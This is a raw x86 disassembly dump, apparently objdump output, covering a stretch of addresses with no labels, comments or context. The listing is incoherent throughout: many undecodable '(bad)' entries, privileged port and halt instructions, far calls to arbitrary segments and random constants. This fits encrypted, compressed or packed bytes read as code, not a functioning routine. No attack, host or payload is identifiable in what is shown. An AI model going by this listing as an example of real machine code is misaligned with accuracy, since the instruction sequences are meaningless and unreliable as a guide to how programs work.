  4165d8:	sahf   
  4165d9:	push   es
  4165da:	cwde   
  4165db:	ret    0x6d28
  4165de:	ins    BYTE PTR es:[edi],dx
  4165df:	sbb    al,0x6
  4165e1:	ret    0x4630
  4165e4:	cmp    ecx,ebp
  4165e6:	cmp    edx,DWORD PTR [ecx]
  4165e8:	sti    
  4165e9:	test   eax,0xc3b0cf1e
  4165ee:	mov    bl,0x83
  4165f0:	or     DWORD PTR [edx],0x9a698bdc
  4165f6:	ret    
  4165f7:	fwait
  4165f8:	push   esp
  4165f9:	inc    esi
  4165fa:	inc    esi
  4165fb:	xlat   BYTE PTR ds:[ebx]
  4165fc:	xchg   ebx,eax
  4165fd:	push   ss
  4165fe:	imul   ecx,DWORD PTR [ebx],0xffffffe0
  416601:	into   
  416602:	push   edx
  416603:	xchg   esp,eax
  416604:	adc    bh,BYTE PTR [edx]
  416606:	scas   eax,DWORD PTR es:[edi]
  416607:	call   0x456a:0x6b5cc591
  41660e:	xchg   esp,eax
  41660f:	sahf   
  416610:	xchg   ebp,eax
  416611:	add    eax,0x9080c35d
  416616:	dec    ecx
  416617:	push   ebx
  416618:	jae    0x4165d8
  41661a:	fadd   QWORD PTR [esi+edi*1+0x4589f647]
  416621:	adc    esi,DWORD PTR [ebx+0x78]
  416624:	adc    eax,0x27aa1dad
  416629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41662a:	shl    DWORD PTR [ecx+eiz*8+0x423642e4],1
  416631:	rol    ecx,0xe6
  416634:	(bad)  
  416635:	sti    
  416636:	inc    eax
  416637:	pop    esi
  416638:	lods   al,BYTE PTR ds:[esi]
  416639:	pop    esp
  41663a:	xor    eax,0x870257e3
  41663f:	(bad)  
  416640:	int    0x23
  416642:	aas    
  416643:	push   ds
  416644:	cmp    bl,BYTE PTR [eax-0xff7e072]
  41664a:	loop   0x4166c1
  41664c:	stos   BYTE PTR es:[edi],al
  41664d:	push   edi
  41664e:	js     0x41664f
  416650:	sub    BYTE PTR [esi],ch
  416652:	rcl    DWORD PTR ds:0x9cef3f20,0x70
  416659:	adc    WORD PTR [ecx+0x53],0x5f
  41665e:	pop    ds
  41665f:	mov    es,ebp
  416661:	dec    eax
  416662:	loopne 0x4166cf
  416664:	lock fdivr QWORD PTR [ebp-0x1f]
  416668:	xor    BYTE PTR fs:[edi+ebp*2-0x16002765],0x31
  416671:	jns    0x416644
  416673:	fbld   TBYTE PTR [esi+0x37863d1e]
  416679:	mov    ds:0x8015b4da,eax
  41667e:	pop    ebx
  41667f:	dec    eax
  416680:	arpl   WORD PTR [edi],ax
  416682:	hlt    
  416683:	mov    al,ds:0x22206e89
  416688:	in     al,0xd3
  41668a:	nop
  41668b:	adc    al,0x6e
  41668d:	arpl   WORD PTR [ecx+ecx*4+0x8847893],di
  416694:	xchg   esi,eax
  416695:	imul   eax,DWORD PTR [esi-0x59f566c6],0x5376f7a6
  41669f:	rol    DWORD PTR [ebp-0x5af9e1e5],0xd6
  4166a6:	mov    esp,0x1d20d352
  4166ab:	in     eax,dx
  4166ac:	mov    esi,0xb19ab572
  4166b1:	xor    al,0xa9
  4166b3:	leave  
  4166b4:	push   es
  4166b5:	lea    ebx,[esi+ebx*4-0x4b]
  4166b9:	xchg   BYTE PTR [edi],bl
  4166bb:	(bad)
  4166be:	adc    eax,0xf402a269
  4166c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166c4:	adc    edi,DWORD PTR [ecx]
  4166c6:	cmp    ebx,ebp
  4166c8:	add    esp,ecx
  4166ca:	push   esi
  4166cb:	(bad)  
  4166cc:	ja     0x416660
  4166ce:	add    BYTE PTR cs:0x981dc025,ch
  4166d5:	shl    DWORD PTR [ebp-0x2d],0x45
  4166d9:	or     BYTE PTR [esp+esi*8+0x31f52297],0x2b
  4166e1:	pop    edx
  4166e2:	jbe    0x4166c4
  4166e4:	sub    eax,0xf07dd2e9
  4166e9:	inc    esi
  4166ea:	shr    DWORD PTR [edx],0x1e
  4166ed:	or     cl,bh
  4166ef:	jl     0x41675e
  4166f1:	gs push ecx
  4166f3:	rcl    al,cl
  4166f5:	inc    eax
  4166f6:	jo     0x4166af
  4166f8:	shl    BYTE PTR [esi],1
  4166fa:	adc    BYTE PTR [eax+0x13b9ae75],0xde
  416701:	add    al,0x42
  416703:	dec    esp
  416704:	jle    0x41673d
  416706:	sub    al,0x38
  416708:	arpl   WORD PTR [esp+ecx*2+0x562505f9],bp
  41670f:	and    edx,ebx
  416711:	inc    ecx
  416712:	pop    ecx
  416713:	rcl    al,1
  416715:	dec    edi
  416716:	add    eax,0x48928f20
  41671b:	push   0xfa45f8c0
  416720:	dec    ecx
  416721:	dec    esi
  416722:	mov    ecx,0xb8327c68
  416727:	xchg   ebp,eax
  416728:	or     DWORD PTR [edi-0xa96664c],ecx
  41672e:	into   
  41672f:	adc    al,0xeb
  416731:	dec    ecx
  416732:	jmp    0x41678d
  416734:	xor    ebx,DWORD PTR [eax+0x43750270]
  41673a:	in     eax,0xee
  41673c:	add    esi,DWORD PTR [edx+0x5]
  41673f:	xchg   BYTE PTR [ebp+0x1e],al
  416742:	adc    DWORD PTR [esi],ebp
  416744:	in     al,0xa5
  416746:	dec    ebx
  416747:	shl    ebx,0xb3
  41674a:	loopne 0x4166cf
  41674c:	sub    BYTE PTR [ebx-0x251d5823],dl
  416752:	aad    0x39
  416754:	pop    edi
  416755:	nop
  416756:	leave  
  416757:	mov    al,al
  416759:	sub    BYTE PTR [ebx+0x76],ch
  41675c:	les    esp,FWORD PTR ds:0x84a34d7
  416762:	ins    DWORD PTR es:[edi],dx
  416763:	jmp    0x41677e
  416765:	jle    0x416757
  416767:	mov    al,ds:0x1002406c
  41676c:	dec    ebp
  41676d:	fimul  WORD PTR [edx-0x43]
  416770:	xor    dh,BYTE PTR [edx+edi*1-0x5]
  416774:	and    ebx,edi
  416776:	xor    al,0x1f
  416778:	data16 fisub DWORD PTR [edi+0x17]
  41677c:	sub    al,0x88
  41677e:	adc    al,0x29
  416780:	enter  0x9751,0xdc
  416784:	ror    BYTE PTR [ebx],cl
  416786:	fisttp DWORD PTR [ebp-0x4f]
  416789:	fld    TBYTE PTR [ecx+0xe]
  41678c:	les    edi,FWORD PTR [ebp-0x3641be13]
  416792:	fnsave [edi*1+0x692f9101]
  416799:	mov    ebp,0x3d1c742f
  41679e:	add    BYTE PTR [ecx+0x7f596a96],bh
  4167a4:	jmp    0x4167dc
  4167a6:	jle    0x41680a
  4167a8:	rol    BYTE PTR [ecx],0xc9
  4167ab:	pushf  
  4167ac:	shr    DWORD PTR [eax],0xba
  4167af:	retf   0x1031
  4167b2:	pop    esi
  4167b3:	push   esi
  4167b4:	repz gs xor eax,0xfb4d1beb
  4167bb:	sar    esp,0x72
  4167be:	jb     0x416783
  4167c0:	push   ebx
  4167c1:	stc    
  4167c2:	in     eax,0x78
  4167c4:	inc    edx
  4167c5:	mov    al,0xe
  4167c7:	sub    dh,BYTE PTR [ebp-0x44]
  4167ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167cb:	cmp    eax,0xa06c2ee8
  4167d0:	push   esp
  4167d1:	sti    
  4167d2:	pop    esp
  4167d3:	push   edx
  4167d4:	xor    eax,0xd3184397
  4167d9:	xor    DWORD PTR [esi+0x1c7ab7b5],0xc618c12d
  4167e3:	(bad)  
  4167e4:	and    al,BYTE PTR [edx]
  4167e6:	push   esi
  4167e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e8:	ja     0x416778
  4167ea:	call   0x5ae9:0xdb7fd01f
  4167f1:	mov    esi,0x107abf1d
  4167f6:	cs cmc 
  4167f8:	inc    ebp
  4167f9:	jge    0x4167fd
  4167fb:	(bad)  
  4167fc:	adc    ch,BYTE PTR [ebx-0x367891c8]
  416802:	fisubr DWORD PTR [ebx+0xb629641]
  416808:	loopne 0x4167d3
  41680a:	cli    
  41680b:	hlt    
  41680c:	or     DWORD PTR [edi+0xd],edx
  41680f:	mov    esp,0x1956eaac
  416814:	out    dx,al
  416815:	xor    eax,0x9984343c
  41681a:	xor    eax,0xc26bad61
  41681f:	cmp    DWORD PTR [esi+ebx*8+0x307b8ab2],esi
  416826:	jmp    0x41689c
  416828:	mov    WORD PTR [ebx+0x6d1ef981],?
  41682e:	cs adc ch,bl
  416831:	mov    ?,ebx
  416833:	lock int 0xcc
  416836:	aaa    
  416837:	loope  0x41684c
  416839:	aaa    
  41683a:	pusha  
  41683b:	adc    BYTE PTR [edx+0x46],bl
  41683e:	je     0x4167cb
  416840:	out    dx,al
  416841:	aas    
  416842:	shr    DWORD PTR [ebp-0x1a],0x38
  416846:	and    cl,al
  416848:	bswap  edx
  41684a:	std    
  41684b:	mov    al,0x99
  41684d:	cld    
  41684e:	pop    eax
  41684f:	and    DWORD PTR [edx+0x5e0e6959],eax
  416855:	loop   0x416861
  416857:	fsub   QWORD PTR [ebp+eiz*4-0x11]
  41685b:	pop    esp
  41685c:	mov    ebp,0x62369dcd
  416861:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  416863:	cmp    eax,0xcd9d891a
  416868:	stos   DWORD PTR es:[edi],eax
  416869:	aad    0xdc
  41686b:	repnz jmp 0x1921:0xae45779c
  416873:	inc    esi
  416874:	sbb    al,BYTE PTR [edi+0x48]
  416877:	into   
  416878:	mov    BYTE PTR [ebp-0x3d58c2ce],ah
  41687e:	fucom  st(2)
  416880:	jne    0x41686c
  416882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416883:	xchg   ecx,eax
  416884:	xchg   esp,eax
  416885:	aad    0x78
  416887:	sbb    bh,BYTE PTR [edx+ebp*2+0xaa73421]
  41688e:	int3   
  41688f:	sti    
  416890:	fcmovu st,st(2)
  416892:	stc    
  416893:	mov    dl,0xba
  416895:	int3   
  416896:	loope  0x4168a8
  416898:	in     eax,dx
  416899:	adc    edx,0x69ba0db7
  41689f:	adc    eax,0x153e6369
  4168a4:	pop    eax
  4168a5:	popf   
  4168a6:	mov    dh,0x7
  4168a8:	push   cs
  4168a9:	mov    ds:0x812eaba0,al
  4168ae:	and    DWORD PTR [ecx+0x58bfc59e],esi
  4168b4:	cmp    edx,DWORD PTR [edi+eiz*2-0x5c]
  4168b8:	push   edi
  4168b9:	add    DWORD PTR [ebp-0x42],0xb5c3cc73
  4168c0:	and    BYTE PTR [ecx],bl
  4168c2:	sub    ebx,DWORD PTR [esp+edi*8]
  4168c5:	mov    ds:0x719289a5,eax
  4168ca:	popf   
  4168cb:	call   0xa23adcad
  4168d0:	ins    BYTE PTR es:[edi],dx
  4168d1:	out    0x75,al
  4168d3:	lds    eax,FWORD PTR [eax-0x7b]
  4168d6:	mov    edi,0x8f8f2f0
  4168db:	add    esp,eax
  4168dd:	inc    ebp
  4168de:	sbb    eax,0x2c94fa4
  4168e3:	addr16 push edi
  4168e5:	push   ds
  4168e6:	sub    BYTE PTR [edx+0x20e2d473],0xc9
  4168ed:	lea    edx,[ecx+esi*4+0x6]
  4168f1:	push   cs
  4168f2:	jge    0x4168a4
  4168f4:	cmp    esi,DWORD PTR [ecx-0x2528a0aa]
  4168fa:	mov    BYTE PTR [ebp-0x61a306b7],dh
  416900:	enter  0x87a2,0x4b
  416904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416905:	fidiv  DWORD PTR ds:0x5b0b48b4
  41690b:	mov    BYTE PTR [esi-0x3e],bh
  41690e:	jmp    0x22b596d3
  416913:	cmp    eax,0xb68c7d85
  416918:	scas   eax,DWORD PTR es:[edi]
  416919:	inc    eax
  41691a:	cmp    eax,0x2d433b34
  41691f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416920:	fisttp WORD PTR [esi+edx*2-0x768571e6]
  416927:	rcr    BYTE PTR [esi+0x34],1
  41692a:	daa    
  41692b:	jnp    0x4168d7
  41692d:	cmp    DWORD PTR [edx],eax
  41692f:	adc    ch,BYTE PTR [edx-0x3eab925f]
  416935:	int    0x93
  416937:	outs   dx,DWORD PTR ds:[esi]
  416938:	les    eax,FWORD PTR [eax-0x68]
  41693b:	or     BYTE PTR [esi+0x7d6ae633],ah
  416941:	in     eax,0x93
  416943:	shr    esp,1
  416945:	lods   eax,DWORD PTR ds:[esi]
  416946:	stos   DWORD PTR es:[edi],eax
  416947:	out    dx,al
  416948:	ret    0x1430
  41694b:	sub    DWORD PTR [ebp+0x43a2d710],edi
  416951:	sti    
  416952:	mov    WORD PTR [esi],gs
  416954:	out    dx,al
  416955:	(bad)  
  416956:	mov    ds:0x1ccb33fc,al
  41695b:	and    al,0x18
  41695d:	sub    eax,0x72ccb115
  416962:	or     DWORD PTR [edx],edx
  416964:	into   
  416965:	jne    0x4169c6
  416967:	and    eax,0x60584356
  41696c:	scas   eax,DWORD PTR es:[edi]
  41696d:	sbb    al,0x2d
  41696f:	jne    0x4169ec
  416971:	pop    esp
  416972:	xchg   esi,eax
  416973:	pop    ds
  416974:	leave  
  416975:	popa   
  416976:	cmp    DWORD PTR [eax+edx*4+0x33b12661],0x76
  41697e:	inc    BYTE PTR [ebx+eiz*1-0x6a]
  416982:	imul   eax,esi,0xed83d37b
  416988:	xor    al,0x33
  41698a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41698b:	enter  0x9616,0x5c
  41698f:	jbe    0x41699a
  416991:	push   esp
  416992:	pusha  
  416993:	(bad)  
  416994:	arpl   WORD PTR [ecx],bx
  416996:	lods   eax,DWORD PTR ds:[esi]
  416997:	popf   
  416998:	(bad)  
  416999:	xlat   BYTE PTR ds:[ebx]
  41699a:	mov    DWORD PTR [ebp+0x3],edi
  41699d:	push   ebx
  41699e:	mov    dl,0x28
  4169a0:	repnz (bad) 
  4169a2:	adc    edi,esp
  4169a4:	push   ss
  4169a5:	push   ecx
  4169a6:	add    eax,0xedffe012
  4169ab:	stc    
  4169ac:	mov    WORD PTR [edx*1-0x11d442a5],cs
  4169b3:	cmc    
  4169b4:	add    eax,0x4284e003
  4169b9:	sbb    DWORD PTR [ecx-0xeb6336c],ebx
  4169bf:	(bad)  
  4169c0:	ror    BYTE PTR [edi+0x2],1
  4169c3:	xor    eax,ebx
  4169c5:	sub    edi,ebx
  4169c7:	sub    ebp,DWORD PTR [edi-0x701646b0]
  4169cd:	fisttp WORD PTR [ebp+0x10]
  4169d0:	push   ss
  4169d1:	sbb    al,0x1f
  4169d3:	test   BYTE PTR [edx+0x576ff281],0x70
  4169da:	sbb    al,0xa4
  4169dc:	inc    eax
  4169dd:	repz add edx,DWORD PTR [ecx-0x42]
  4169e1:	je     0x41697e
  4169e3:	push   DWORD PTR [eax+0x7d]
  4169e6:	outs   dx,DWORD PTR ds:[esi]
  4169e7:	test   BYTE PTR [esi+0x30],bh
  4169ea:	dec    eax
  4169eb:	pop    ecx
  4169ec:	(bad)  
  4169ed:	xlat   BYTE PTR ds:[ebx]
  4169ee:	test   al,0xe4
  4169f0:	(bad)
  4169f4:	cmp    ch,BYTE PTR [ecx-0x59]
  4169f7:	nop
  4169f8:	jne    0x416a17
  4169fa:	push   ds
  4169fb:	sub    eax,0xe83a5f41
  416a00:	push   edx
  416a01:	js     0x416a67
  416a03:	retf   0x1929
  416a06:	adc    BYTE PTR [ecx+eax*4+0x7fed9471],bl
  416a0d:	jge    0x76cecdab
  416a13:	outs   dx,DWORD PTR ds:[esi]
  416a14:	cli    
  416a15:	push   eax
  416a16:	retf   
  416a17:	xchg   esp,eax
  416a18:	push   ss
  416a19:	cdq    
  416a1a:	add    DWORD PTR [ebp-0x23],0xffffff9d
  416a1e:	xlat   BYTE PTR ds:[ebx]
  416a1f:	push   ebp
  416a20:	mov    al,ds:0x747b569a
  416a25:	jbe    0x4169f8
  416a27:	add    ebx,ecx
  416a29:	out    dx,eax
  416a2a:	sbb    ecx,ecx
  416a2c:	out    dx,al
  416a2d:	stc    
  416a2e:	adc    bh,0x55
  416a31:	adc    ch,BYTE PTR [esi+0x2]
  416a34:	into   
  416a35:	and    bl,dl
  416a37:	in     eax,dx
  416a38:	stos   DWORD PTR es:[edi],eax
  416a39:	pop    esi
  416a3a:	out    0xe3,al
  416a3c:	xor    al,BYTE PTR [ebp+0x3f]
  416a3f:	xor    edi,DWORD PTR [edi-0x17]
  416a42:	(bad)
  416a47:	sbb    DWORD PTR [esi],esp
  416a49:	pop    es
  416a4a:	and    BYTE PTR ds:0xf202172,al
  416a50:	push   esi
  416a51:	push   ds
  416a52:	adc    dl,BYTE PTR [eax]
  416a54:	push   esi
  416a55:	sub    esi,DWORD PTR ds:0x29cbd2dc
  416a5b:	shl    DWORD PTR [esi],1
  416a5d:	shr    BYTE PTR [edx],0x25
  416a60:	mov    ebp,0x95ba73d8
  416a65:	fild   QWORD PTR [eax+0x13]
  416a68:	aas    
  416a69:	lods   al,BYTE PTR ds:[esi]
  416a6a:	mov    bh,0x1e
  416a6c:	fs pusha 
  416a6e:	jno    0x416a9d
  416a70:	popa   
  416a71:	push   ss
  416a72:	(bad)  
  416a73:	rcl    DWORD PTR [ebp-0x17],cl
  416a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a77:	ja     0x416a86
  416a79:	mov    DWORD PTR [edi],0xf0cd4473
  416a7f:	div    DWORD PTR [eax+eiz*1+0x50]
  416a83:	and    eax,0x519a9b58
  416a88:	mov    al,0x51
  416a8a:	or     ebp,DWORD PTR [eax+0x7f2f83ec]
  416a90:	mov    ah,0xf
  416a92:	and    DWORD PTR [ebx+ebx*1+0xefb3143],ecx
  416a99:	pop    esi
  416a9a:	push   edi
  416a9b:	js     0x416b18
  416a9d:	sar    DWORD PTR [ecx-0x60],0xa4
  416aa1:	sbb    ecx,esi
  416aa3:	xor    eax,0x2b67c689
  416aa8:	inc    esi
  416aa9:	hlt    
  416aaa:	jns    0x416ac8
  416aac:	fbld   TBYTE PTR [ebx]
  416aae:	int    0xd9
  416ab0:	mov    edi,0x2b9cbb4c
  416ab5:	adc    al,0x49
  416ab7:	mov    es:0x3a800113,eax
  416abd:	push   cs
  416abe:	fidiv  DWORD PTR [esi+0x51]
  416ac1:	sbb    eax,0x3bd1ea16
  416ac6:	sbb    cl,BYTE PTR ds:0x8f9efbd2
  416acc:	pop    edx
  416acd:	mov    DWORD PTR [ebx],ebx
  416acf:	dec    ebx
  416ad0:	add    BYTE PTR [esi+ebp*2],cl
  416ad3:	sbb    al,0xc1
  416ad5:	mov    bl,BYTE PTR [ebp+ecx*2+0x43]
  416ad9:	and    esi,esp
  416adb:	cmp    ebp,0xfc4cec06
  416ae1:	xchg   ebx,eax
  416ae2:	xor    bl,BYTE PTR [edx-0x4c]
  416ae5:	and    cl,BYTE PTR [eax+ebx*2-0x64]
  416ae9:	aam    0x2
  416aeb:	nop
  416aec:	dec    ecx
  416aed:	and    al,0xf2
  416aef:	or     esp,DWORD PTR [edx+edi*1-0x20]
  416af3:	(bad)  
  416af5:	(bad)  
  416af6:	outs   dx,WORD PTR ds:[esi]
  416af8:	repz mov bl,0x62
  416afb:	jle    0x416b1a
  416afd:	xchg   dx,ax
  416aff:	xor    DWORD PTR [ebp+0x33559202],esp
  416b05:	xchg   edi,eax
  416b06:	aaa    
  416b07:	sar    BYTE PTR [edx],cl
  416b09:	xor    ebx,DWORD PTR [eax-0x7f8d4839]
  416b0f:	xchg   ch,ch
  416b11:	call   0x91fb:0x5fac6078
  416b18:	mov    bh,0x9a
  416b1a:	xchg   edi,eax
  416b1b:	fnstenv [esi+0x2b]
  416b1e:	mov    ds:0x192881f9,eax
  416b23:	mov    al,ds:0xf07070ad
  416b28:	add    eax,0xdac830c9
  416b2d:	les    ebx,FWORD PTR [ebx]
  416b2f:	cmp    BYTE PTR [ebx-0xa408bec],bl
  416b35:	pop    ebx
  416b36:	call   0x440d:0x149eeec4
  416b3d:	aaa    
  416b3e:	aam    0x1
  416b40:	les    ecx,FWORD PTR [edi+ecx*1-0x5b0e6db1]
  416b47:	retf   
  416b48:	xchg   ebx,eax
  416b49:	fmul   DWORD PTR ds:0xa880e5dd
  416b4f:	imul   eax,DWORD PTR [eax],0xfffffffa
  416b52:	jl     0x416ba6
  416b54:	arpl   WORD PTR [esi],si
  416b56:	popa   
  416b57:	psrlq  mm7,mm3
  416b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b5b:	loopne 0x416afd
  416b5d:	(bad)  
  416b5e:	pop    esp
  416b5f:	aaa    
  416b60:	loope  0x416b74
  416b62:	iret   
  416b63:	inc    edi
  416b64:	xor    bl,BYTE PTR [ebx-0x369df11d]
  416b6a:	ins    BYTE PTR es:[edi],dx
  416b6b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416b6d:	stc    
  416b6e:	push   esi
  416b6f:	cmp    dl,bl
  416b71:	mov    ds:0xeefb31a0,eax
  416b76:	xor    esi,DWORD PTR [esi]
  416b78:	xor    eax,0xdd71282c
  416b7d:	out    dx,eax
  416b7e:	xchg   ecx,eax
  416b7f:	call   0x5b1f:0x2da29656
  416b86:	pop    es
  416b87:	mov    ecx,DWORD PTR [ecx-0x72]
  416b8a:	dec    esp
  416b8b:	loop   0x416b71
  416b8d:	mov    es,WORD PTR [esi+edi*2-0x2e58658b]
  416b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b95:	mov    dh,0xf0
  416b97:	popa   
  416b98:	test   al,0x72
  416b9a:	(bad)  
  416b9b:	adc    al,0xc9
  416b9d:	rcr    DWORD PTR [ecx],0x1
  416ba0:	outs   dx,DWORD PTR ds:[esi]
  416ba1:	xchg   edx,eax
  416ba2:	jns    0x416b42
  416ba4:	xchg   BYTE PTR [edx],ch
  416ba6:	or     eax,0x3aeda8f4
  416bab:	in     al,0x91
  416bad:	add    DWORD PTR [edi],ebp
  416baf:	and    al,0xd3
  416bb1:	in     al,dx
  416bb2:	push   eax
  416bb3:	pop    es
  416bb4:	pusha  
  416bb5:	aam    0x78
  416bb7:	outs   dx,BYTE PTR ds:[esi]
  416bb8:	fisttp WORD PTR [eax+ecx*1]
  416bbb:	xlat   BYTE PTR ds:[ebx]
  416bbc:	xchg   edx,eax
  416bbd:	imul   edx,DWORD PTR [edi-0x1e],0x41
  416bc1:	cmc    
  416bc2:	xor    DWORD PTR ds:0x5d9245ff,edx
  416bc8:	retf   
  416bc9:	xor    DWORD PTR [esi+0x60],ecx
  416bcc:	cld    
  416bcd:	fs stos DWORD PTR es:[edi],eax
  416bcf:	and    eax,0x5376c261
  416bd4:	xor    ch,ah
  416bd6:	pusha  
  416bd7:	clc    
  416bd8:	stos   BYTE PTR es:[edi],al
  416bd9:	jbe    0x416b74
  416bdb:	outs   dx,DWORD PTR ds:[esi]
  416bdc:	(bad)  
  416bdd:	ss push ecx
  416bdf:	add    BYTE PTR [ebp+0x3ea3e40e],cl
  416be5:	and    BYTE PTR [ecx-0x3d],0x1
  416be9:	jo     0x416ba5
  416beb:	call   0xa8d4:0x1e35ca20
  416bf2:	sbb    al,0x32
  416bf4:	test   eax,0x5d4802e0
  416bf9:	hlt    
  416bfa:	shr    BYTE PTR fs:[ecx+0x12],cl
  416bfe:	mov    ah,dh
  416c00:	psllw  mm1,mm4
  416c03:	or     ch,0xe2
  416c06:	push   ds
  416c07:	dec    BYTE PTR [ebx+edx*8]
  416c0a:	cs leave 
  416c0c:	jne    0x416c68
  416c0e:	mov    bl,0x33
  416c10:	add    ecx,0x387c863d
  416c16:	mov    bh,0xce
  416c18:	ror    BYTE PTR ds:0x7972eea0,1
  416c1e:	push   ds
  416c1f:	xor    al,BYTE PTR [edi]
  416c21:	push   ss
  416c22:	arpl   WORD PTR [edx-0x14c3610],di
  416c28:	or     al,0xf2
  416c2a:	fidivr DWORD PTR [eax-0x5da98a1b]
  416c30:	das    
  416c31:	scas   al,BYTE PTR es:[edi]
  416c32:	lock es push cs
  416c35:	jge    0x416bce
  416c37:	push   ebp
  416c38:	mov    ebx,0x30955581
  416c3d:	adc    ebx,DWORD PTR [esi-0x2623efe4]
  416c43:	dec    esi
  416c44:	dec    ebx
  416c45:	sub    bl,bl
  416c47:	mov    eax,0xeb57a9f
  416c4c:	icebp  
  416c4d:	mov    esi,0x2bff5dd5
  416c52:	ss aaa 
  416c54:	cmp    eax,0x7ff0c20f
  416c59:	jb     0x416c61
  416c5b:	mov    eax,ds:0x10ef1c75
  416c60:	dec    ebp
  416c61:	aaa    
  416c62:	sub    eax,0x9e335e51
  416c67:	es jecxz 0x416c2f
  416c6a:	add    BYTE PTR [ebx-0x25],al
  416c6d:	cld    
  416c6e:	mul    BYTE PTR [edx+0x529d50b6]
  416c74:	rcl    DWORD PTR [esi+0x4e051c9c],1
  416c7a:	or     al,0x3e
  416c7c:	dec    esp
  416c7d:	jg     0x416c04
  416c7f:	out    0x43,eax
  416c81:	jg     0x416cc8
  416c83:	in     al,dx
  416c84:	inc    ecx
  416c85:	dec    DWORD PTR [edi-0x14e0b564]
  416c8b:	popf   
  416c8c:	add    eax,0x9ba38728
  416c91:	nop
  416c92:	adc    DWORD PTR [eax-0x5fc05eb8],esp
  416c98:	pop    esp
  416c99:	adc    al,0x90
  416c9b:	sbb    eax,0xd9693929
  416ca0:	cli    
  416ca1:	lahf   
  416ca2:	mov    esi,0xbd7444b2
  416ca7:	dec    eax
  416ca8:	mov    BYTE PTR [ebp+0x396875f3],al
  416cae:	mov    esi,0xbefcecb6
  416cb3:	sbb    DWORD PTR [ecx-0x3c37d62f],edi
  416cb9:	mov    ch,0x57
  416cbb:	mov    bl,0xcc
  416cbd:	push   ss
  416cbe:	dec    ecx
  416cbf:	mov    al,0x29
  416cc1:	dec    ebx
  416cc2:	ret    
  416cc3:	add    bh,0xf5
  416cc6:	sbb    DWORD PTR [edi],0xffffffb9
  416cc9:	push   ds
  416cca:	sub    bl,cl
  416ccc:	test   eax,0x5d67401e
  416cd1:	push   cs
  416cd2:	cmp    DWORD PTR [eax],0x5e
  416cd5:	cmp    eax,0x1fab654f
  416cda:	lds    ecx,FWORD PTR [ebp+ebx*4+0x22]
  416cde:	mov    esp,0x1cb15fdd
  416ce3:	sbb    eax,0xa0fd10ca
  416ce8:	ss inc esi
  416cea:	adc    bh,BYTE PTR [edi+0x1499b591]
  416cf0:	xlat   BYTE PTR ds:[ebx]
  416cf1:	nop
  416cf2:	outs   dx,DWORD PTR ds:[esi]
  416cf3:	or     al,0x18
  416cf5:	xor    esp,DWORD PTR [edi]
  416cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cf8:	jae    0x416cd4
  416cfa:	jb     0x416d00
  416cfc:	pop    esp
  416cfd:	aam    0x24
  416cff:	popa   
  416d00:	jne    0x416d65
  416d02:	cli    
  416d03:	ret    
  416d04:	mov    ch,0x7d
  416d06:	push   0x19
  416d08:	(bad)  
  416d0a:	push   ss
  416d0b:	push   0x5234b1d2
  416d10:	call   0xb37b:0xc38f381b
  416d17:	lock fist DWORD PTR [ebx+ebx*2]
  416d1b:	adc    BYTE PTR [edi-0x16],dl
  416d1e:	sbb    esi,ebp
  416d20:	mov    ecx,0xb1b5e9b7
  416d25:	scas   al,BYTE PTR es:[edi]
  416d26:	mov    esi,0x9bbde082
  416d2b:	test   al,0x63
  416d2d:	xchg   ebx,eax
  416d2e:	loopne 0x416cf5
  416d30:	dec    ebx
  416d31:	and    DWORD PTR [edi],eax
  416d33:	inc    esp
  416d34:	cmc    
  416d35:	xor    ebx,DWORD PTR [edi-0x923d634]
  416d3b:	pop    edi
  416d3c:	aaa    
  416d3d:	or     eax,0x11a8799d
  416d42:	fnsave [edx+0xc]
  416d45:	popf   
  416d46:	retf   
  416d47:	mov    ah,0x8c
  416d49:	shl    BYTE PTR [ecx+0x741db456],0xae
  416d50:	sti    
  416d51:	inc    edi
  416d52:	aam    0xdd
  416d54:	(bad)  
  416d55:	int3   
  416d56:	test   BYTE PTR [ecx-0x44bff926],cl
  416d5c:	test   al,0xe2
  416d5e:	lods   eax,DWORD PTR ds:[esi]
  416d5f:	xchg   DWORD PTR [ebp-0x1f],eax
  416d62:	add    eax,0x51ef88e9
  416d67:	sbb    DWORD PTR [ecx-0x62],0xffffffd9
  416d6b:	add    eax,edx
  416d6d:	ja     0x416d9a
  416d6f:	jbe    0x416d46
  416d71:	rcr    DWORD PTR [ebp+0x52409317],cl
  416d77:	sbb    ebp,DWORD PTR [edi]
  416d79:	adc    eax,0x499ac45a
  416d7e:	aad    0x1
  416d80:	push   0x78
  416d82:	sahf   
  416d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d84:	or     al,ch
  416d86:	fimul  WORD PTR [edi]
  416d88:	mov    ebp,0xdfef6f83
  416d8d:	xchg   esp,eax
  416d8f:	and    eax,0x77f1c94b
  416d94:	int3   
  416d95:	sub    eax,0x587863db
  416d9a:	xchg   ebp,eax
  416d9b:	loopne 0x416e12
  416d9d:	ja     0x416deb
  416d9f:	mov    dh,0x8f
  416da1:	mov    cl,0xdd
  416da3:	test   eax,0x81b703bf
  416da8:	test   BYTE PTR [esi],ah
  416daa:	fsubr  QWORD PTR [ebx-0x3c]
  416dad:	daa    
  416dae:	es daa 
  416db0:	mov    ebp,0x87285f3
  416db5:	mov    ah,BYTE PTR [ebx+edi*8]
  416db8:	rcl    DWORD PTR [esi-0x5cd28030],cl
  416dbe:	push   edi
  416dbf:	test   BYTE PTR [ebx-0x6657a170],bl
  416dc5:	cmp    ecx,ebp
  416dc7:	into   
  416dc8:	push   cs
  416dc9:	jp     0x416e2d
  416dcb:	aas    
  416dcc:	rcl    BYTE PTR [eax+0x214ce724],0x62
  416dd3:	sub    BYTE PTR [ebx],ah
  416dd5:	inc    edx
  416dd6:	push   esi
  416dd7:	(bad)  
